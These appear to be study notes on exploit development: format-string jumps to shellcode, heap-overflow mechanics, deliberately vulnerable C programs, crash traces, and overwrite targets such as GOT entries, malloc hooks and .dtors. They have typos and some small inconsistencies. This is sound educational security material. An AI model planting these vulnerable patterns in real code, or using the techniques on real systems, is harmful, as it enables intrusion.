	- Using a register-relative jump if we're brute forcing, which gives us a much better chance of hitting our shellcode (if it's in our format string).
		- For example, if our chellcode is at `esp+0x200`, we can overwrite some of the OGT with something like this:
		```
		add $0x200, %esp
		jmp esp
		```
		- This gives us the location of the code that will jump to our shellcode, so when we overwrite our function pointer (GOT entry, or whatever) we know that we will land in our shellcode. 
			- The same technique works for any other register that happens to be pointing at or close to our shellcode after the format string has been evaluated. In fact, we can fairly easily write a small shellcode snippet that will find the location of a larger shellcode buffer, and then jump to it.
				- See Gera and Riq’s excellent Phrack paper at http://www.phrack.org/archives/issues/59/7.txt for more information.

##
# Chapter 5: Introduction to Heap Overflows
- `malloc()` breaks up a big block of memory allocated with `brk()` into chunks and gives the user one of those chunks when a request is made, potentially using a large chunk and splitting it into two chunks to do so. 
- Fragmentation ---> lots of little used chunks of memory interspersed with lots of littel free chunks of memory. 

- **A Few Real World Examples:**
	- Samba (the programmer allows us to copy a big block of memory wherever we want):
	```
	memcpy(array[user_supplied_int], user_supplied_buffer, user_supplied_int2);
	```
	- Microsoft IIS:
	```
	buf=malloc(strlen(user_buf+5));
	strcpy(buf, user_buf);
	```
	- Solaris Login:
	```
	buf=(char **)malloc(BUF_SIZE);
	while (user_buf[i]!=0){
		buf[i]=malloc(strlen(user_buf[i])+1);
		i++;
	}
	```
	- Solaris Xsun:
	```
	buf=malloc(1024);
	strcpy(buf, user_supplied);
	```
	
	- Common Integer Overflow / Heap Overflow Combination:
	```
	buff=malloc(sizeof(something) *user_controlled_int);
	for(i=0; i<user_controlled_int; i++){
		if(user_buf[i]==0)
			break;
		copyinto(buf, user_buf)
	}
	```
* * * 
## Basic Heap Overflows
- Non Vulnearble Example:
```
/*notvuln.c*/
int main(int argc, char** argv)
{
    char *buf;
    buf=(char*)malloc(1024);
    printf(“buf=%p”,buf);
    strcpy(buf,argv[1]);
    free(buf);
}
```
- Vulnerable Example:
```
/*basicheap.c*/
int main(int argc, char** argv) 
{
	char *buf;
	char *buf2;
    buf=(char*)malloc(1024);
    buf2=(char*)malloc(1024);
    printf(“buf=%p buf2=%p\n”,buf,buf2);
    strcpy(buf,argv[1]);
    free(buf2);
}
```
```
########################
# Command Line Example #
########################
[user@localhost]$ ltrace ./basicheap `perl -e ‘print “A” x 5000’`
  __libc_start_main(0x080483c4, 2, 0xbfffe694, 0x0804829c, 0x0804845c
  <unfinished
  ...>
  malloc(1024) = 0x080495b0
  malloc(1024) = 0x080499b8
  printf(“buf=%p buf2=%p\n”, 134518192buf=0x80495b0 buf2=0x80499b8
  ) = 29
  strcpy(0x080495b0, “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA”...) = 0x080495b0
  free(0x080499b8) = <void>
  --- SIGSEGV (Segmentation fault) ---
  +++ killed by SIGSEGV +++

```
- **The difference here is that a buffer is allocated after the buffer than can be overflowed.**
	- There are two buffers, one after another in memory, and the second buffer is corrupted by the first buffer being overflowed.
		- Buffer 2's meta-data stucture is corrupted during the overflow and when it is freed, the collecting functionality of the malloc library accesses invalid memory
	- **Note:** Once you have a way to trigger a heap overflow, you should then think of the vulnerable program as a special API for calling `malloc()`, `free()`, and `realloc()`. The order of the allocation calls, the sizes, and the contents of the data put into the stored buffers need to be manipulated in order to write a successful exploit. 
	- **Note:** Don’t forget to use `ulimit -c unlimited` if you are not getting core dumps.
	 
* * * 

## Intermediate Heap Overflows
- Instead of calling `free()` as seen in the Basic Heap Overflow example, the overflowed program will call `malloc()`. This is generally trickier to exploit than the Basic Heap Overflow example, but it is exploitable in the sam fashion.
```
/*heap2.c – a vulnerable program that calls malloc() */
int main(int argc, char **argv)
{
   char * buf,*buf2,*buf3;
   buf=(char*)malloc(1024);
   buf2=(char*)malloc(1024);
   buf3=(char*)malloc(1024);
   free(buf2);
   strcpy(buf,argv[1]);
   buf2=(char*)malloc(1024); //this was a free() in the previous example
   printf(“Done.”); //we will use this to take control in our exploit
}
```


- `int3` ---> the debug interrupt

##
## Advance Heap Overflow Exploitation
- When looking at a heap overflow that is moderately complex, you must go through several non-trivial steps:
	1. **Normalize the Heap** - This may mean simply connecting to the process, if it forks and calls execve, or starting up the processes whith execve() if it's a local exploit. The important thing is to know how the heap is set up initially. 
	2. **Set up the heap for your exploit** - This may mean many meaningless connections to get malloc functions called in the correct sizes and orders for the heap to be set up favorably to your exploit.
	3. **Overflow one or more chunks** - Get the program to call a malloc funciton (or several malloc functions) to overwrite one or more words. Next, make the program execute one of the function pointers you overwrote.

## What to Overwrite
- Generally, follow these 3 strategies:
1. Overwrite a funciton pointer.
2. Overwrite a set of code that is in a writable segment.
3. If writing two words, write a bit of code, then overwrite a funciton poiter to point to that code. In addition, you can overwrite a logincal variable (such as `is_logged_in`) to change program flow. 

- **Note:**  It is important to stop thinking of exploits as interchangeable. Every exploit has a unique environment, determined by the state of the program, the things you can do to the program, and the particular bug or bugs you exploit. Don’t restrict yourself to thinking about the program only after you have exploited the bugs. What you do before you trigger a bug is just as important to the sta- bility and success of your exploit.

## GOT Entries
- Use `objdump -R` to read the GOT funciton pointers from `heap2`:
```
[user@bash]$ objdump -R ./heap2

./heap2:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE			VALUE
08049654 R_386_GLOB_DAT		__gmon_start__	
08049640 R_386_JUMP_SLOT	malloc
08049644 R_386_JUMP_SLOT	__libc_start_main
08049648 R_386_JUMP_SLOT	printf
0804964c R_386_JUMP_SLOT	free
08049650 R_386_JUMP_SLOT	strcpy
```
	

 ## Global Funciton Pointers
 - Many libraries such as `malloc.c` rely on global function pointers to manipulate their debugging information, or logging information, or some other frequently used functionality. `__free_hook`, `__malloc_hook`, and `__realloc_hook` are often useful in programs that call one of these functions after you are able to perform an overwrite. 

## .DTORS
- `.DTORS` are destructors gcc uses on exit
- In the following example, we could use `8049632c` as a function pointer when the program calls `exit` to get control:
```
[user@bash]$ objdump -j .dtors -s heap2
heap2:     file format elf32-i386

###############################
Contents of section .dtors: 
8049628 ffffffff 00000000 ........
```

- **Side Note: Memory Region Alignment (applies to stack and heap)** 
	- On a 32-bit machine, data alignment deals in 4 byte chunks, meaning a call to memory can only call regions that are multiples of 4 and will call that region as well as the 3 adjacent regions (x, x+1, x+2, x+3).
	- On a 64-bit machine, data alignment deals in 8 byte chunks. 
	- In order to avoid mialignment in structs, the compiler will introduce an alignment requirement into every structure that stipulates the alignment size will be that of the *largest member of the structure*. 
		- If we need nested structures, the size of the largest inner structure will be the alignment of the immediate larger structure.
	- When a value does not fill the entire region that it has been assigned to the remaining space is filled with padding bytes up to the next aligned address.
		- **To minimize padding**, the programmer should declare the structue members in their increasing/decreasing order of size (keep the order consistent).
		- In some cases, the use of padding can be avoided by turning it off with a command line switch and instructing the processor to read byte-by-byte, however this comes at a hit to performance. 

- Other Attack Targets for Heap Overflow:
	- **atexit Handlers**
		- atexit handlers can be found on systems without symbols for `exit_funcs`. These are also called upon program exit. They are exit handlers.
	- **Stack Values**
		- The saved return address on the stack is often in a predictable place for local execution. However, because you cannon predict or control the environment on a remote attack, this is probably not your best choice.

## Conclusion
- Because most heap overflows corrupt a malloc() data structure to obtain control, some work has been done in the area of protective canaries for various malloc() implementations, similar in theory to stack canaries, but these have not yet caught on in most malloc() implementations.
	- **Heap Canaries are a potential mitigation method to prevent Heap overflows**
- Even if heap canaries become commonplace, some heap overflows don’t work by manipu- lating the malloc() implementation, and many programs will continue to be vulnerable.
 

	
